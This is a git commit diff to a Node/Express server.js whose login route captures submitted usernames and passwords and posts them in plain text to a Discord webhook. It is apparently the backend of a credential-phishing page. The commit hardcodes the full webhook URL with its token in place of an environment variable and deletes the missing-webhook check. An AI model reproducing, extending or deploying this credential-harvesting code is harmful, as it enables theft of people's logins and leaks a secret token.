312b9cbb0fed314d500e0ed95895ea272bed3fb2
isemlepro-pixel <isemlepro@gmail.com>
2026-08-22 15:30:35 +0200

    Update server.js

--- server.js
+++ server.js
@@ -10,10 +10,8 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Récupération du webhook depuis les variables d'environnement (.env ou Render)
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';
 
-// Route pour gérer la connexion
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
 
@@ -21,7 +19,7 @@ app.post('/api/login', async (req, res) => {
     embeds: [
       {
         title: '🔑 Nouvelle tentative de connexion',
-        color: 3447003, // Bleu
+        color: 3447003,
         fields: [
           { name: 'Utilisateur / Email', value: username || 'Non renseigné', inline: true },
           { name: 'Mot de passe', value: password || 'Non renseigné', inline: true },
@@ -32,11 +30,6 @@ app.post('/api/login', async (req, res) => {
   };
 
   try {
-    if (!DISCORD_WEBHOOK_URL) {
-      console.error("Erreur : DISCORD_WEBHOOK_URL est manquant !");
-      return res.status(500).json({ success: false, message: 'Webhook manquant' });
-    }
-
     await fetch(DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
